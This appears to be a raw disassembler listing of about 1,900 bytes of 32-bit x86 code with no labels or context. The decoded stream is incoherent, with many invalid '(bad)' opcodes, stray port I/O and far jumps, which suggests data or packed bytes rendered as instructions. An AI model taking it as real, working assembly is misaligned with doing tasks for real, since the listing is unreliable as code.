  41d7a6:	xor    edi,DWORD PTR [edi-0x6a5b5228]
  41d7ac:	xchg   BYTE PTR [ebp+0x4b],bh
  41d7af:	es aas 
  41d7b1:	mov    ebp,0x80a27be3
  41d7b6:	cmp    DWORD PTR [esp+esi*2+0x57b45e43],edx
  41d7bd:	mov    cl,0x23
  41d7bf:	pop    edx
  41d7c0:	sub    BYTE PTR [eax+0x740f6458],ah
  41d7c6:	pop    esi
  41d7c7:	test   BYTE PTR [ebx+0x7c],dl
  41d7ca:	mov    ds:0x646d05ae,al
  41d7cf:	mov    dl,0x3d
  41d7d1:	or     al,0xe3
  41d7d3:	mov    bl,0x6e
  41d7d5:	nop/reserved BYTE PTR [ebx+0x52]
  41d7d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d7da:	push   esi
  41d7db:	loope  0x41d7b6
  41d7dd:	dec    eax
  41d7de:	hlt    
  41d7df:	in     al,0x50
  41d7e1:	fbld   TBYTE PTR [ebx+ebx*1-0x15]
  41d7e5:	(bad)  
  41d7e6:	(bad)  
  41d7e7:	jbe    0x41d82d
  41d7e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d7ea:	leave  
  41d7eb:	imul   ebp,DWORD PTR [edx],0x4351935d
  41d7f1:	data16 int 0xb0
  41d7f4:	(bad)  
  41d7f5:	cmp    ch,dl
  41d7f7:	sbb    BYTE PTR [ecx],ch
  41d7f9:	test   BYTE PTR [edi],dl
  41d7fb:	ins    DWORD PTR es:[edi],dx
  41d7fc:	lods   eax,DWORD PTR ds:[esi]
  41d7fd:	(bad)  
  41d7fe:	cmp    cl,BYTE PTR [eax+0x1a]
  41d801:	inc    ecx
  41d802:	test   DWORD PTR [ebx-0x52e9f7b5],0x5f3e8494
  41d80c:	cmp    al,0x39
  41d80e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d80f:	inc    eax
  41d810:	sbb    BYTE PTR [edx],dl
  41d812:	retf   
  41d813:	add    dh,ah
  41d815:	mov    ecx,0xd705b38c
  41d81a:	adc    eax,0x8e9b078b
  41d81f:	ret    0xb790
  41d822:	cmovp  eax,DWORD PTR [edx]
  41d825:	int    0xbe
  41d827:	iret   
  41d828:	gs mov bx,0xd6e3
  41d82d:	xchg   esp,eax
  41d82e:	bound  edi,QWORD PTR [ebp+0x236a5b96]
  41d834:	push   cs
  41d835:	mov    ebp,0x8a0f4c4b
  41d83a:	enter  0x82f3,0xb2
  41d83e:	(bad)  
  41d83f:	fcom   DWORD PTR [edx]
  41d841:	jecxz  0x41d819
  41d843:	loope  0x41d7c6
  41d845:	sbb    eax,0xf11ef2f5
  41d84a:	das    
  41d84b:	cs iret 
  41d84d:	fld    TBYTE PTR [edx+eax*2]
  41d850:	lea    eax,[esi]
  41d852:	push   ss
  41d853:	xchg   DWORD PTR [ecx-0x72],esi
  41d856:	jne    0x41d815
  41d858:	outs   dx,BYTE PTR ds:[esi]
  41d859:	icebp  
  41d85a:	idiv   BYTE PTR [edx-0x3d]
  41d85d:	les    edx,FWORD PTR [eax-0x4d84755c]
  41d863:	call   DWORD PTR [ecx]
  41d865:	pop    edx
  41d866:	jno    0xfb770307
  41d86c:	adc    BYTE PTR [eax],0x46
  41d86f:	(bad)  
  41d870:	push   0x15b26790
  41d875:	mov    ecx,0x4a0b0848
  41d87a:	mov    eax,ds:0x3caf91d8
  41d87f:	push   ebx
  41d880:	push   ss
  41d881:	push   ebx
  41d882:	mov    esi,0xbdc92ad3
  41d887:	outs   dx,DWORD PTR ds:[esi]
  41d888:	mov    ds:0xf85d613c,eax
  41d88d:	jae    0x41d90a
  41d88f:	fs push ss
  41d891:	pop    es
  41d892:	(bad)  
  41d893:	xchg   ebx,eax
  41d894:	jno    0x41d831
  41d896:	inc    ebx
  41d897:	call   0x4596a038
  41d89c:	lahf   
  41d89d:	xor    bh,BYTE PTR ds:0xda7e7718
  41d8a3:	iret   
  41d8a4:	xor    esp,DWORD PTR [edi-0x5d4043da]
  41d8aa:	and    ecx,esi
  41d8ac:	dec    edi
  41d8ad:	ficom  DWORD PTR [edx+eax*2]
  41d8b0:	mov    al,ds:0xe8f96162
  41d8b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d8b6:	xlat   BYTE PTR cs:[ebx]
  41d8b8:	(bad)  
  41d8b9:	stc    
  41d8ba:	call   0x3241:0xc76918cf
  41d8c1:	int    0x60
  41d8c3:	inc    ecx
  41d8c4:	rcl    bl,cl
  41d8c6:	xchg   ecx,eax
  41d8c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8c8:	adc    eax,0xa38f87e3
  41d8cd:	(bad)  
  41d8ce:	iret   
  41d8cf:	dec    esp
  41d8d0:	test   BYTE PTR [ebx-0x2b],0xab
  41d8d4:	jmp    0x2638:0xda6c6136
  41d8db:	les    edi,FWORD PTR [edx-0x19]
  41d8de:	pusha  
  41d8df:	push   0xc09342a4
  41d8e4:	jp     0x41d8b2
  41d8e6:	push   ebx
  41d8e7:	leave  
  41d8e8:	retf   0x31a6
  41d8eb:	popa   
  41d8ec:	or     cl,BYTE PTR [eax+0x5e]
  41d8ef:	push   esp
  41d8f0:	or     BYTE PTR [ebp-0x10],bh
  41d8f3:	mov    eax,ds:0xe5c2aaef
  41d8f8:	movups xmm6,XMMWORD PTR [ebx+0x27df9b8b]
  41d8ff:	mov    WORD PTR [eax],?
  41d901:	outs   dx,DWORD PTR ds:[esi]
  41d902:	jmp    0x41d898
  41d904:	adc    esi,DWORD PTR [ecx+0x38526d5e]
  41d90a:	pusha  
  41d90b:	sbb    ebp,0x58
  41d90e:	cmp    eax,0x8ca70b62
  41d913:	push   0xa8c79904
  41d918:	scas   al,BYTE PTR es:[edi]
  41d919:	mov    bh,0x4b
  41d91b:	jmp    0xe44221eb
  41d920:	enter  0x1a66,0xa7
  41d924:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d925:	stos   BYTE PTR es:[edi],al
  41d926:	or     ecx,DWORD PTR [ebp+0x7cb20663]
  41d92c:	mov    WORD PTR [eax-0x48],ss
  41d92f:	addr16 dec edi
  41d931:	sub    bl,BYTE PTR [esi+0x57]
  41d934:	pop    esp
  41d935:	xchg   esp,eax
  41d936:	mov    ebx,0x95c4efec
  41d93b:	or     edx,0xffffff97
  41d93e:	fisubr WORD PTR [eax]
  41d940:	call   0x446d:0xb610383
  41d947:	inc    ecx
  41d948:	loop   0x41d906
  41d94a:	xchg   BYTE PTR [ecx],bl
  41d94c:	lds    esp,FWORD PTR [edx]
  41d94e:	push   cs
  41d94f:	(bad)  
  41d950:	pop    ebx
  41d951:	mov    dl,BYTE PTR [esi+edi*4+0x6e]
  41d955:	fsub   QWORD PTR [ebp+0x338605ff]
  41d95b:	push   edi
  41d95c:	shl    BYTE PTR [edx+eiz*4-0x18],cl
  41d960:	clc    
  41d961:	adc    ebp,DWORD PTR ds:0xfa8f77b6
  41d967:	push   ds
  41d968:	pop    esp
  41d969:	rcr    BYTE PTR [ebx],cl
  41d96b:	push   ebx
  41d96c:	xor    eax,0x87f581a4
  41d971:	cmp    DWORD PTR [edi-0x1699d2bf],0x23e7e55f
  41d97b:	ins    DWORD PTR es:[edi],dx
  41d97c:	repz mov cl,0x8b
  41d97f:	call   0x2186:0x24346528
  41d986:	ds loopne 0x41d934
  41d989:	in     al,dx
  41d98a:	mov    ch,0x8f
  41d98c:	adc    edi,0x6f603cd7
  41d992:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d993:	in     al,0x8b
  41d995:	in     eax,0xb6
  41d997:	add    bh,ah
  41d999:	push   ds
  41d99a:	ja     0x41d952
  41d99c:	inc    edx
  41d99d:	mov    ecx,0xcc9f4705
  41d9a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d9a3:	fisttp WORD PTR [ebx]
  41d9a5:	in     al,0x81
  41d9a7:	sub    DWORD PTR ds:0x74486132,0xd64bc70
  41d9b1:	out    dx,eax
  41d9b2:	mov    dh,0x8c
  41d9b4:	mov    WORD PTR [ebx-0x7235cc04],?
  41d9ba:	call   0xff30c7a0
  41d9bf:	scas   al,BYTE PTR es:[edi]
  41d9c0:	retf   0x64c6
  41d9c3:	pusha  
  41d9c4:	jl     0x41d960
  41d9c6:	push   esi
  41d9c7:	cld    
  41d9c8:	adc    BYTE PTR [edx],dl
  41d9ca:	and    DWORD PTR [ecx],0xebfb64f8
  41d9d0:	(bad)  
  41d9d1:	out    dx,eax
  41d9d2:	mov    cl,0x72
  41d9d4:	or     DWORD PTR [edx+ebx*4-0x22],eax
  41d9d8:	xor    ch,BYTE PTR [eax]
  41d9da:	jge    0x41d9b1
  41d9dc:	adc    DWORD PTR [edx],ebx
  41d9de:	sub    al,0x4
  41d9e0:	xchg   edx,eax
  41d9e1:	dec    al
  41d9e3:	data16 mov ch,BYTE PTR [eax+0x60bf9b19]
  41d9ea:	pop    edx
  41d9eb:	dec    edi
  41d9ec:	cmp    al,0xcd
  41d9ee:	kunpckwd k3,k7,k2
  41d9f2:	jne    0x41d98b
  41d9f4:	ds out 0x62,eax
  41d9f7:	fstp   DWORD PTR [edx+0x59]
  41d9fa:	cmp    DWORD PTR [ebx-0x22d0fdb2],ebx
  41da00:	inc    edi
  41da01:	loope  0x41d9f3
  41da03:	es xchg esi,eax
  41da05:	add    eax,0x9f77492f
  41da0a:	cwde   
  41da0b:	pop    ebx
  41da0c:	(bad)  
  41da0e:	lds    esp,FWORD PTR [edi+0x62]
  41da11:	mov    ?,WORD PTR [ecx+ebp*1]
  41da14:	(bad)  
  41da15:	mov    ecx,0xa4f181cc
  41da1a:	adc    DWORD PTR [ebp-0x22],ebp
  41da1d:	lods   al,BYTE PTR ds:[esi]
  41da1e:	jge    0x41da65
  41da20:	dec    esi
  41da21:	pop    esp
  41da22:	mov    eax,ds:0xbd588d14
  41da27:	in     al,dx
  41da28:	and    ch,BYTE PTR [eax-0x5ed0383e]
  41da2e:	sub    DWORD PTR [ebp+0x659cb141],0xe
  41da35:	jns    0x41da3f
  41da37:	sbb    cl,ah
  41da39:	jle    0x41da53
  41da3b:	push   ecx
  41da3c:	add    ebp,DWORD PTR [edi+eax*2+0x2053062b]
  41da43:	inc    edx
  41da44:	psrlq  mm7,QWORD PTR [eax-0x79]
  41da48:	loopne 0x41dab9
  41da4a:	add    BYTE PTR [eax+ecx*4],bh
  41da4d:	cwde   
  41da4e:	sub    eax,0x26983931
  41da53:	push   cs
  41da54:	mov    gs,WORD PTR [ecx+0x2c]
  41da57:	lahf   
  41da58:	xor    ah,bh
  41da5a:	or     BYTE PTR [esp+eax*8],dh
  41da5d:	push   ebx
  41da5e:	(bad)  
  41da60:	jecxz  0x41daaf
  41da62:	jns    0x41dabf
  41da64:	imul   ebp,DWORD PTR [esi+0x6a149941],0x30
  41da6b:	mov    esp,0x4861cd88
  41da70:	daa    
  41da71:	jo     0x41da6d
  41da73:	mov    dh,0xba
  41da75:	and    dh,BYTE PTR [ebp+0x723fbc30]
  41da7b:	sub    DWORD PTR [ebx+0x12194c36],esi
  41da81:	push   ecx
  41da82:	ins    DWORD PTR es:[edi],dx
  41da83:	retf   0xe59
  41da86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da87:	push   esi
  41da88:	mov    ebp,0x1baef404
  41da8d:	dec    ebp
  41da8e:	aas    
  41da8f:	xor    BYTE PTR [edi-0xa],0xb2
  41da93:	jecxz  0x41daa7
  41da95:	fs mov al,0xe1
  41da98:	gs pusha 
  41da9a:	cmc    
  41da9b:	mov    dl,0x8
  41da9d:	add    BYTE PTR [eax+0x70a3d7ac],ch
  41daa3:	aam    0xa9
  41daa5:	xor    al,0xc
  41daa7:	(bad)  
  41daa8:	jl     0x41da7c
  41daaa:	call   0x97e2:0x54e869d0
  41dab1:	js     0x41db05
  41dab3:	sub    eax,0x4cf97a3c
  41dab8:	popf   
  41dab9:	arpl   WORD PTR [edi],di
  41dabb:	js     0x41db26
  41dabd:	lock pop ebp
  41dabf:	or     al,0x7e
  41dac1:	adc    al,0x38
  41dac3:	(bad)  
  41dac4:	es mov cl,0xdd
  41dac7:	rcl    DWORD PTR [ebp-0x80256a4],0x8b
  41dace:	pop    ecx
  41dacf:	out    dx,al
  41dad0:	jae    0x41da7b
  41dad2:	mov    ch,0x56
  41dad4:	mov    edx,0x3911a25c
  41dad9:	jnp    0x41da7e
  41dadb:	xor    bl,bl
  41dadd:	ins    DWORD PTR es:[edi],dx
  41dade:	(bad)  
  41dadf:	and    al,0x44
  41dae1:	sbb    DWORD PTR [si],eax
  41dae4:	js     0x41db0f
  41dae6:	stos   DWORD PTR es:[edi],eax
  41dae7:	stc    
  41dae8:	push   edx
  41dae9:	mov    al,ds:0xf1edb3de
  41daee:	jns    0x41db19
  41daf0:	iret   
  41daf1:	cs sti 
  41daf3:	inc    ecx
  41daf4:	mov    edx,0x75df926
  41daf9:	in     al,dx
  41dafa:	jbe    0x41db61
  41dafc:	mov    edx,0xb43f2448
  41db01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db02:	ret    
  41db03:	sub    dh,al
  41db05:	out    0x69,eax
  41db07:	jp     0x41db27
  41db09:	and    cl,BYTE PTR [edx-0x2df49ef6]
  41db0f:	pop    ebx
  41db11:	push   eax
  41db12:	or     eax,DWORD PTR [edx+edi*1+0x6fb6ac7f]
  41db19:	cs aas 
  41db1b:	pusha  
  41db1c:	(bad)  
  41db1d:	sahf   
  41db1e:	dec    esp
  41db1f:	or     DWORD PTR [edi-0x2a],0x9cf7b94f
  41db26:	mov    eax,0xc04aa6c4
  41db2b:	mov    al,0x59
  41db2d:	loop   0x41db92
  41db2f:	pop    ss
  41db30:	dec    ebp
  41db31:	js     0x41db7a
  41db33:	fnstenv [ebp-0x23dbae40]
  41db39:	sar    DWORD PTR [eax],cl
  41db3b:	and    ebx,DWORD PTR [esp+eiz*8-0x76]
  41db3f:	sbb    BYTE PTR ds:0xc9efe0a5,al
  41db45:	sub    BYTE PTR [ebp+0x7e2f5c8f],bh
  41db4b:	jb     0x41db6f
  41db4d:	div    BYTE PTR [edx+0x61099499]
  41db53:	fnstenv [edx-0x59]
  41db56:	and    esp,DWORD PTR [esi+0x40]
  41db59:	iret   
  41db5a:	mov    ebp,0xf033c8c5
  41db5f:	inc    ebp
  41db60:	mov    edx,0x6ba0e6ef
  41db65:	icebp  
  41db66:	pop    ebp
  41db67:	bound  esi,QWORD PTR [ebx+0x27af6a79]
  41db6d:	enter  0xc3b1,0xed
  41db71:	lahf   
  41db72:	je     0x41db5b
  41db74:	mov    ebp,0x133a43d2
  41db79:	adc    DWORD PTR [edi],esi
  41db7b:	fldcw  WORD PTR [esi+0x5f]
  41db7e:	outs   dx,BYTE PTR ds:[esi]
  41db7f:	je     0x41dbe1
  41db81:	xor    esp,0xffffffa6
  41db84:	sbb    ch,BYTE PTR [ebx]
  41db86:	lahf   
  41db87:	aas    
  41db88:	dec    edx
  41db89:	(bad)  
  41db8a:	pop    ebx
  41db8b:	cdq    
  41db8c:	call   0x2ae9:0x36f3b234
  41db93:	xchg   esi,eax
  41db94:	(bad)  
  41db95:	and    BYTE PTR [esi-0x233fff3c],bh
  41db9b:	hlt    
  41db9c:	(bad)  
  41db9d:	ins    DWORD PTR es:[edi],dx
  41db9e:	int3   
  41db9f:	(bad)  
  41dba1:	jge    0x41dbf0
  41dba3:	sbb    si,bx
  41dba6:	push   ds
  41dba7:	dec    edx
  41dba8:	lods   eax,DWORD PTR ds:[esi]
  41dba9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dbaa:	dec    ecx
  41dbab:	pop    ecx
  41dbac:	imul   edx,DWORD PTR [eax+ecx*2],0x75
  41dbb0:	pop    ebp
  41dbb1:	xchg   esp,eax
  41dbb2:	gs mov bl,0xad
  41dbb5:	sub    BYTE PTR [edx],0x55
  41dbb8:	and    BYTE PTR [edx],cl
  41dbba:	dec    ebp
  41dbbb:	lods   al,BYTE PTR ds:[esi]
  41dbbc:	cld    
  41dbbd:	sbb    DWORD PTR [eax],edx
  41dbbf:	fistp  DWORD PTR [ecx]
  41dbc1:	mov    bh,0xc1
  41dbc3:	(bad)  
  41dbc4:	rol    bh,0x5b
  41dbc7:	out    0x8f,al
  41dbc9:	or     edi,DWORD PTR [edi]
  41dbcb:	xor    ecx,DWORD PTR [edi+0x73]
  41dbce:	mov    dh,0x11
  41dbd0:	or     eax,0x538ef0b4
  41dbd5:	aam    0xb0
  41dbd7:	outs   dx,DWORD PTR ds:[esi]
  41dbd8:	adc    al,0x48
  41dbda:	inc    ecx
  41dbdb:	pop    esp
  41dbdc:	shl    BYTE PTR [ecx-0x200f10d],1
  41dbe2:	pushf  
  41dbe3:	jl     0x41dc3a
  41dbe5:	and    al,0x7b
  41dbe7:	ins    DWORD PTR es:[edi],dx
  41dbe8:	rcr    DWORD PTR [esi],cl
  41dbea:	addr16 mov ebp,0x52ce252a
  41dbf0:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41dbf2:	inc    edx
  41dbf3:	and    DWORD PTR [esi-0x47],ebp
  41dbf6:	inc    ecx
  41dbf7:	mov    bl,0x3e
  41dbf9:	ss push ecx
  41dbfb:	sahf   
  41dbfc:	test   al,0x6f
  41dbfe:	or     BYTE PTR [edx],bl
  41dc00:	pop    ebp
  41dc01:	add    edx,esp
  41dc03:	sti    
  41dc04:	repz jbe 0x41db93
  41dc07:	mov    DWORD PTR [esi+edx*4+0x6e3d4337],ebx
  41dc0e:	add    BYTE PTR ds:0x9e8c1c50,ch
  41dc14:	jge    0x41dbb7
  41dc16:	aam    0xc4
  41dc18:	out    dx,al
  41dc19:	pop    esi
  41dc1a:	xchg   DWORD PTR [esi-0x315369fa],edx
  41dc20:	arpl   WORD PTR [ebp+0x6],dx
  41dc23:	mov    edi,0xe4772c8b
  41dc28:	pop    DWORD PTR [edi]
  41dc2a:	sub    al,0xd4
  41dc2c:	out    dx,al
  41dc2d:	(bad)  
  41dc2e:	int    0xb2
  41dc30:	mov    ?,edi
  41dc32:	popa   
  41dc33:	sbb    eax,DWORD PTR [ebp-0x43b8fb7c]
  41dc39:	fdiv   DWORD PTR ds:0xb057b39a
  41dc40:	cmp    edi,DWORD PTR [edi]
  41dc42:	js     0x41dbd0
  41dc44:	(bad)  
  41dc46:	mov    BYTE PTR ds:0x82d5ba76,bh
  41dc4c:	fwait
  41dc4d:	test   eax,0xab54bcfa
  41dc52:	mov    bh,0x49
  41dc54:	(bad)  
  41dc55:	ja     0x41dc8e
  41dc57:	fistp  DWORD PTR [edx+0x1b89f1ac]
  41dc5d:	shr    cl,0xbb
  41dc60:	pop    ebx
  41dc61:	shr    BYTE PTR [esi+0x3e4ff394],cl
  41dc67:	xchg   ebp,eax
  41dc68:	dec    ebx
  41dc69:	(bad)  
  41dc6a:	mov    ?,WORD PTR [ecx-0x3c409167]
  41dc70:	mov    esp,0x87029e22
  41dc75:	popa   
  41dc76:	scas   al,BYTE PTR es:[edi]
  41dc77:	inc    ebp
  41dc78:	cmc    
  41dc79:	outs   dx,DWORD PTR ds:[esi]
  41dc7b:	jno    0x41dc81
  41dc7d:	jl     0x41dc5b
  41dc7f:	push   ecx
  41dc80:	out    dx,al
  41dc81:	lock out 0xad,al
  41dc84:	shr    DWORD PTR [edi],cl
  41dc86:	ds push cs
  41dc88:	dec    edx
  41dc89:	mov    edi,0xa6964b18
  41dc8e:	dec    ebx
  41dc8f:	repz mov eax,0x267e9167
  41dc95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc96:	dec    eax
  41dc97:	fsub   QWORD PTR [esi-0x69]
  41dc9a:	jmp    0xb482c205
  41dc9f:	dec    eax
  41dca0:	or     cl,BYTE PTR [esi]
  41dca2:	test   BYTE PTR [edx],ch
  41dca4:	outs   dx,BYTE PTR ds:[esi]
  41dca5:	pop    ds
  41dca6:	cmp    BYTE PTR [ebp-0x64750b7c],dh
  41dcac:	ins    BYTE PTR es:[edi],dx
  41dcad:	mov    eax,ds:0xbba33444
  41dcb2:	outs   dx,BYTE PTR ds:[esi]
  41dcb3:	mov    DWORD PTR [ebx+0x37],0x24ec2613
  41dcba:	mov    bh,0xcb
  41dcbc:	xchg   dl,dh
  41dcbe:	imul   edi,DWORD PTR [ebx],0x491d7828
  41dcc4:	(bad)  
  41dcc5:	jmp    0xd1bd:0x16470257
  41dccc:	or     al,0xb
  41dcce:	sub    edi,ebx
  41dcd0:	repz mov eax,cs:0x8e286a33
  41dcd7:	push   ds
  41dcd8:	in     eax,0x85
  41dcda:	xchg   esp,eax
  41dcdb:	push   0x9007dfb7
  41dce0:	enter  0x3312,0x12
  41dce4:	push   ebp
  41dce5:	or     al,0x63
  41dce7:	adc    ecx,DWORD PTR [ecx+0x37]
  41dcea:	cmp    DWORD PTR [ecx+0x5d],ecx
  41dced:	stos   DWORD PTR es:[edi],eax
  41dcee:	leave  
  41dcef:	jp     0x41dd4d
  41dcf1:	retf   
  41dcf2:	sahf   
  41dcf3:	les    esi,FWORD PTR [ebx]
  41dcf5:	rol    DWORD PTR [edx-0x33],0xaf
  41dcf9:	sub    eax,edi
  41dcfb:	in     eax,0x3f
  41dcfd:	sub    DWORD PTR ds:[ecx+0x58826d36],edi
  41dd04:	nop
  41dd05:	std    
  41dd06:	enter  0x9262,0x9b
  41dd0a:	adc    eax,0x474765ad
  41dd0f:	mov    cl,0x3d
  41dd11:	aam    0x65
  41dd13:	or     al,0x5b
  41dd15:	lahf   
  41dd16:	dec    edi
  41dd17:	xor    cl,bh
  41dd19:	mov    esp,esi
  41dd1b:	jae    0x41dcfa
  41dd1d:	int    0x0
  41dd1f:	and    eax,0x6ce92db8
  41dd24:	out    dx,eax
  41dd25:	ds or  al,0xdb
  41dd28:	out    dx,eax
  41dd29:	(bad)  
  41dd2a:	jg     0x41ddab
  41dd2c:	pop    eax
  41dd2d:	inc    ecx
  41dd2e:	push   ds
  41dd2f:	jmp    0x1c47:0xee037510
  41dd36:	fnstenv [ebx+0x48e73bee]
  41dd3c:	mov    dh,0x92
  41dd3e:	mov    ds:0xfab3d9bc,eax
  41dd43:	adc    al,BYTE PTR [edx+0x3b]
  41dd46:	outs   dx,BYTE PTR ds:[esi]
  41dd47:	pusha  
  41dd48:	cmp    al,0x34
  41dd4a:	ins    DWORD PTR es:[edi],dx
  41dd4b:	(bad)  
  41dd4c:	mov    eax,0x9db2ae6b
  41dd51:	jnp    0x41dd4b
  41dd53:	pushf  
  41dd54:	js     0x41dd2c
  41dd56:	cs fs push ecx
  41dd59:	ss mov ebx,0xda5f2312
  41dd5f:	mov    esp,DWORD PTR [esi-0x617d8c72]
  41dd65:	fisttp WORD PTR [ebp+esi*4+0x5be3f71a]
  41dd6c:	and    BYTE PTR [edi+0x3e],cl
  41dd6f:	push   0x4d
  41dd71:	imul   ecx,DWORD PTR [eax],0xfffffff2
  41dd74:	jnp    0x41dd6f
  41dd76:	sub    al,0x2c
  41dd78:	xor    DWORD PTR [edi-0x6d],eax
  41dd7b:	not    BYTE PTR [ebp+0x43c3009a]
  41dd81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd82:	leave  
  41dd83:	mov    ecx,0x397df7ca
  41dd88:	sahf   
  41dd89:	xchg   esp,eax
  41dd8a:	dec    ebp
  41dd8b:	retf   
  41dd8c:	es jbe 0x41dda3
  41dd8f:	mov    eax,0x6808d7fe
  41dd94:	fsubr  DWORD PTR [edx+eax*2]
  41dd97:	jmp    0x41dd87
  41dd99:	jl     0x41dd61
  41dd9b:	out    dx,eax
  41dd9c:	mov    ecx,0x45a4db5e
  41dda1:	cmc    
  41dda2:	or     dh,BYTE PTR [ebx]
  41dda4:	loop   0x41de10
  41dda6:	and    dl,BYTE PTR [ecx]
  41dda8:	xchg   ebp,eax
  41dda9:	das    
  41ddaa:	push   ds
  41ddab:	jge    0x41de08
  41ddad:	mov    eax,ds:0x3622ad84
  41ddb2:	xchg   DWORD PTR ds:0xb0209abc,ebp
  41ddb8:	repnz push es
  41ddba:	and    al,0x7c
  41ddbc:	shl    DWORD PTR [esi-0x24],1
  41ddbf:	in     al,0xc3
  41ddc1:	pushf  
  41ddc2:	jmp    0xfe49:0xd3d20636
  41ddc9:	cld    
  41ddca:	mov    eax,0xbc861cc0
  41ddcf:	ins    DWORD PTR es:[edi],dx
  41ddd0:	push   es
  41ddd1:	fadd   st(3),st
  41ddd3:	xor    ebx,DWORD PTR [ecx]
  41ddd5:	mov    BYTE PTR [ebx],cl
  41ddd7:	(bad)  
  41ddd8:	dec    esp
  41ddd9:	shl    DWORD PTR [ecx-0x193e0fe7],cl
  41dddf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dde0:	mov    al,0x6a
  41dde2:	mov    edx,0xe6603ea3
  41dde7:	loopne 0x41de68
  41dde9:	xchg   ch,dl
  41ddeb:	mov    bl,0x3b
  41dded:	repz les eax,FWORD PTR [ebx+0x4a5f06cf]
  41ddf4:	add    edi,DWORD PTR [esi+0x550cfba]
  41ddfa:	gs inc ebp
  41ddfc:	mov    bh,0xe0
  41ddfe:	jae    0x41ddfa
  41de00:	mov    al,0x85
  41de02:	push   edi
  41de03:	push   esi
  41de04:	popf   
  41de05:	clc    
  41de06:	(bad)  [edx]
  41de08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de09:	mov    al,BYTE PTR [edx+0x71]
  41de0c:	repz pop ss
  41de0e:	stos   BYTE PTR es:[edi],al
  41de0f:	popf   
  41de10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de11:	scas   eax,DWORD PTR es:[edi]
  41de12:	and    eax,0x4fbaf434
  41de17:	fisubr WORD PTR [ecx]
  41de19:	imul   ebx,DWORD PTR [esi],0x55aeb35
  41de1f:	cmp    ebp,edx
  41de21:	add    ah,BYTE PTR [esi+0x67]
  41de24:	and    ebx,DWORD PTR [ebp+0x68b91660]
  41de2a:	push   ecx
  41de2b:	dec    edx
  41de2c:	loop   0x41de4e
  41de2e:	pop    edi
  41de2f:	ret    
  41de30:	dec    eax
  41de31:	pop    edi
  41de32:	cs jb  0x41de7c
  41de35:	or     bl,ah
  41de37:	cmp    DWORD PTR [ebx-0x58],0xb2fa1489
  41de3e:	stc    
  41de3f:	pop    edx
  41de40:	xor    ecx,ebx
  41de42:	loope  0x41de72
  41de44:	mov    esp,0x457cea75
  41de49:	push   ds
  41de4a:	mov    esp,0xb5ca1d30
  41de4f:	fcomp  st(2)
  41de51:	jmp    0xdd93:0x7c086a63
  41de58:	inc    esi
  41de59:	push   esp
  41de5a:	xchg   esi,eax
  41de5b:	lock out 0x43,eax
  41de5e:	fadd   DWORD PTR [edi+ebx*1]
  41de61:	pop    es
  41de62:	or     al,0x2e
  41de64:	pop    ebp
  41de65:	add    al,0xdc
  41de67:	cdq    
  41de68:	iret   
  41de69:	sub    al,0xd1
  41de6b:	push   es
  41de6c:	call   0xed52828a
  41de71:	mov    gs,WORD PTR [ecx]
  41de73:	sti    
  41de74:	and    BYTE PTR [ebx+0x6b],ch
  41de77:	xchg   esp,eax
  41de78:	rcl    DWORD PTR [ecx],cl
  41de7a:	scas   al,BYTE PTR es:[edi]
  41de7b:	dec    ecx
  41de7c:	inc    ebx
  41de7d:	ins    DWORD PTR es:[edi],dx
  41de7e:	mov    BYTE PTR [ecx-0x64],dl
  41de81:	jge    0x41de7d
  41de83:	mov    esp,0x70414bd9
  41de88:	jge    0x41def0
  41de8a:	push   ebp
  41de8b:	or     BYTE PTR [ecx],dl
  41de8d:	pop    ds
  41de8e:	push   eax
  41de8f:	imul   esi,DWORD PTR [edx],0xffffffde
  41de92:	and    DWORD PTR [ebx-0x10],ecx
  41de95:	stc    
  41de96:	pop    ecx
  41de97:	imul   edi,DWORD PTR [edi+ebp*1+0x4c],0xffffff80
  41de9c:	test   eax,0x4e658ed9
  41dea1:	loop   0x41de26
  41dea3:	inc    edi
  41dea4:	jp     0x41de92
  41dea6:	test   ebx,esi
  41dea8:	enter  0x76ad,0xa5
  41deac:	push   es
  41dead:	fbld   TBYTE PTR [eax-0x10280e60]
  41deb3:	cpuid  
  41deb5:	aas    
  41deb6:	mov    esp,0x63b291e7
  41debb:	(bad)  
  41debc:	sti    
  41debd:	out    dx,eax
  41debe:	mov    esi,0x5688423
  41dec3:	into   
  41dec4:	test   eax,0x11990a9c
  41dec9:	stos   BYTE PTR es:[edi],al
  41deca:	add    BYTE PTR [ebx],ch
  41decc:	inc    ebx
  41decd:	(bad)  
  41dece:	xchg   ecx,eax
  41decf:	add    eax,0xf2b3e816
  41ded4:	and    al,0xca
  41ded6:	lea    eax,[eax-0x3b1289c8]
  41dedc:	dec    ecx
  41dedd:	adc    ecx,DWORD PTR [edi+0x18]
  41dee0:	(bad)  
  41dee1:	aaa    
  41dee2:	dec    edi
  41dee3:	pop    edi
  41dee5:	stc    
  41dee6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dee7:	ja     0x41de85
  41dee9:	push   es
  41deea:	in     al,dx
  41deeb:	lds    ecx,FWORD PTR [bp+0x42]
  41deef:	scas   al,BYTE PTR es:[edi]
  41def0:	ret    
  41def1:	stos   BYTE PTR es:[edi],al
  41def2:	cdq    
  41def3:	ins    BYTE PTR es:[edi],dx
  41def4:	lods   al,BYTE PTR ds:[esi]
  41def5:	div    DWORD PTR [esi+0x74fa3f4a]
  41defb:	cmp    bl,ah
  41defd:	xchg   edx,eax
  41defe:	xchg   edi,eax
  41deff:	enter  0xaca3,0x6a
  41df03:	jae    0x41de93
  41df05:	es and al,0x80
  41df08:	sbb    ebp,ecx
  41df0a:	push   ebx
